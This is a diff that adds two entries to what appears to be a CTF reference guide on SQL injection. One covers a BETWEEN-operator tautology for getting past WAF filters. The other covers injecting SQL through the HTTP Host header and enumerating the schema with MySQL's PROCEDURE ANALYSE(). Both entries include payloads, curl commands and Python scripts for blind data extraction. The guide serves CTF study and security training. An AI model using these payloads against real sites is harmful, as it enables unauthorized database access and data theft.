@@ -18,6 +18,8 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [MySQL Session Variable for Dual-Value Injection (MeePwn CTF 2017)](#mysql-session-variable-for-dual-value-injection-meepwn-ctf-2017)
 - [PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)](#php-pcre-backtrack-limit-waf-bypass-secuinside-2017)
 - [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
+- [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
+- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
 
 ---
 
@@ -300,5 +302,103 @@ for _ in range(100):
 ```
 
 **Key insight:** `information_schema.processlist.INFO` exposes the full SQL text of all currently running queries on the MySQL server. By racing an injection query against a concurrent application query that references secrets, those secrets can be captured from the process list. This extends the existing `information_schema.processList` trick by adding a timing/race component to capture transient queries that contain secrets (encryption keys, passwords) only visible during execution.
+
+---
+
+## SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)
+
+**Pattern:** When a WAF blocks comparison operators (`=`, `<`, `>`) and numeric literals, use `id BETWEEN id AND id` as a tautology. Both bounds are column references (not filtered literals), and the expression is always true since a value is always between itself and itself.
+
+```sql
+-- Blocked by WAF: digits and comparison operators filtered
+-- id=1 → blocked, id>0 → blocked, 1=1 → blocked
+
+-- BETWEEN with column names as bounds (always true):
+id BETWEEN id AND id           -- semantically: id <= id AND id >= id → always true
+
+-- Full bypass with UNION:
+' OR id BETWEEN id AND id UNION SELECT flag,2,3 FROM flags--
+
+-- When even UNION is blocked, use with conditional:
+id BETWEEN id AND id AND (SELECT SUBSTR(flag,1,1) FROM flags) BETWEEN 'a' AND 'z'
+```
+
+```python
+import requests
+
+def sqli_between(position, low_char, high_char):
+    """Binary search using BETWEEN for character-by-character extraction."""
+    payload = (
+        f"' OR id BETWEEN id AND id "
+        f"AND SUBSTR((SELECT flag FROM flags LIMIT 1),{position},1) "
+        f"BETWEEN '{low_char}' AND '{high_char}'-- "
+    )
+    r = requests.get("http://target/item", params={"id": payload})
+    return "result" in r.text   # truthy response = condition matched
+```
+
+**Combining with schema enumeration when `information_schema` is blocked:**
+```sql
+-- PROCEDURE ANALYSE() as alternative (see next technique)
+SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
+```
+
+**Key insight:** SQL `BETWEEN col AND col` with the same column as both bounds is semantically a tautology but syntactically avoids digit and comparison operator signatures. Combine with string column references for blind extraction when numeric literals and `=`/`<`/`>` are filtered.
+
+---
+
+## Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)
+
+**Pattern:** The HTTP `Host` header is used in a SQL query (e.g., to log access or resolve virtual hosts) without sanitization. Since Host is rarely tested by WAFs, standard injection techniques work. When `information_schema` is blocked, MySQL's `PROCEDURE ANALYSE()` provides table and column enumeration.
+
+```bash
+# Test: inject into Host header
+curl -H "Host: ' OR '1'='1'--" http://target/
+# If response differs → Host header is injected into SQL
+
+# UNION injection via Host header:
+curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/
+
+# When information_schema is blocked, use PROCEDURE ANALYSE():
+curl -H "Host: ' UNION SELECT * FROM users PROCEDURE ANALYSE()-- " http://target/
+# PROCEDURE ANALYSE() returns column types and suggested data types, leaking column names
+```
+
+```python
+import requests
+
+TARGET = "http://target/"
+
+def host_sqli(payload):
+    r = requests.get(TARGET, headers={"Host": payload})
+    return r.text
+
+# Enumerate tables via PROCEDURE ANALYSE() when information_schema blocked:
+# First: get column names from a known/guessed table
+result = host_sqli("' UNION SELECT username,password FROM users PROCEDURE ANALYSE()-- ")
+print(result)
+
+# PROCEDURE ANALYSE() output includes: field names, min/max values, optimal data type
+# This leaks column names, row counts, and sample values
+```
+
+**PROCEDURE ANALYSE() output structure:**
+```sql
+-- Returns rows like:
+-- Field_name: database.table.column
+-- Min_value / Max_value: actual data ranges
+-- Optimal_fieldtype: suggested column type
+-- The "Field_name" column leaks fully qualified column names: db.table.column
+```
+
+**Other Host header injection vectors:**
+```text
+X-Forwarded-For      # logged to DB as client IP
+X-Real-IP            # same
+User-Agent           # logged for analytics
+Referer              # logged for referral tracking
+```
+
+**Key insight:** `PROCEDURE ANALYSE()` is a MySQL-specific alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.
 
 ---
